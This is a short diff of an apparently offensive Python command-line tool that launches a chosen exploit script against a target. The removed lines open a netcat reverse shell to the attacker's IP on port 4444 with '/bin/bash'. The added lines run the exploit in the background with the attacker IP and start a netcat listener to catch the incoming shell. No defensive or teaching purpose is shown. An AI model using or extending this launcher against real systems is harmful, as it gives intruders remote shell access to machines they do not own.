@@ -90,8 +90,8 @@ class MyCLI(cmd.Cmd):
             if not self.exploit:
             	print("Exploit not set. Use 'setexploit <exploit number>' to set the exploit.")
             	return
-            os.system(f"python {self.exploit}")
-            os.system(f"nc -nv {self.attacker_ip} 4444 -e /bin/bash") 
+            os.system(f"python {self.exploit} {self.attacker_ip} &")
+            os.system("nc -lvp 4444") 
         
     def do_settarget(self, arg):
         self.target = arg
